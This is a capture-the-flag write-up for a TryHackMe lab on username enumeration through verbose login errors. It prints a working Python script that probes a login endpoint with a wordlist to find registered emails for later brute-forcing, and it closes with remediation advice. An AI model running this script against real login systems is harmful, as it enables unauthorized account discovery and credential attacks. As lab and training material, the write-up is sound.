# Authentication Bypass — TryHackMe Writeup

![Category](https://img.shields.io/badge/Category-Web_Security-blue.svg)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen.svg)
![Topic](https://img.shields.io/badge/Topic-Username_Enumeration-orange.svg)
![Platform](https://img.shields.io/badge/Platform-TryHackMe-red.svg)

A complete security research and penetration testing writeup for the **Authentication Bypass** lab on TryHackMe, covering username enumeration via verbose login error messages and automated credential testing.

---

## 📋 Executive Summary
Flawed authentication mechanisms frequently disclose sensitive information before password verification occurs. In this lab (`http://enum.thm`), the login API on `/labs/verbose_login/functions.php` differentiates between unregistered accounts and incorrect passwords via distinct JSON error messages. By developing a Python enumeration script (`script.py`) and running it against `usernames_gmail.com.txt`, valid target user accounts were identified for subsequent credential testing.

* **Target URL:** `http://enum.thm/labs/verbose_login/functions.php`
* **Vulnerability:** Information Disclosure / Verbose Authentication Errors
* **Artifacts in Directory:**
  * `script.py`: Custom Python automated email enumeration client
  * `usernames_gmail.com.txt`: Wordlist containing target email addresses

---

## 🔍 Stage 1: Vulnerability Analysis (Verbose Responses)

### 1.1 Inspecting the Login API
Submitting authentication attempts to `/labs/verbose_login/functions.php` yields JSON responses:

* **Non-existent User:**
  ```json
  {"status": "error", "message": "Email does not exist"}
  ```
* **Existing User with Incorrect Password:**
  ```json
  {"status": "error", "message": "Password does not match"}
  ```

This discrepancy allows attackers to enumerate registered users without triggering account lockouts or password verification throttles.

---

## 🛠️ Stage 2: Automated Enumeration (`script.py`)

We automated the dictionary scan across `usernames_gmail.com.txt`:
```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (Pentest Toolkit)',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest'
    }
    data = {'username': email, 'password': 'dummy_password', 'function': 'login'}
    return requests.post(url, headers=headers, data=data).json()

def enumerate_emails(email_file):
    valid_emails = []
    with open(email_file, 'r') as f:
        emails = [line.strip() for line in f if line.strip()]

    for email in emails:
        resp = check_email(email)
        if resp.get('status') == 'error' and 'Email does not exist' in resp.get('message', ''):
            print(f"[-] Invalid: {email}")
        else:
            print(f"[+] VALID USER FOUND: {email}")
            valid_emails.append(email)
    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)
    print("Discovered Accounts:", enumerate_emails(sys.argv[1]))
```

Executing the script filters registered enterprise accounts out of thousands of candidates, providing verified targets for targeted brute-force testing.

---

## 🛡️ Remediation
1. **Generic Authentication Responses:** Return uniform error messages regardless of whether the email or password failed:
   ```text
   "Invalid email or password."
   ```
2. **Timing Normalization:** Ensure backend execution time remains identical for existing and non-existing accounts to prevent timing-based user enumeration.
3. **Rate Limiting & CAPTCHA:** Implement rate limiting (e.g., max 5 attempts per IP per minute) and introduce CAPTCHA challenges on repeated login failures.
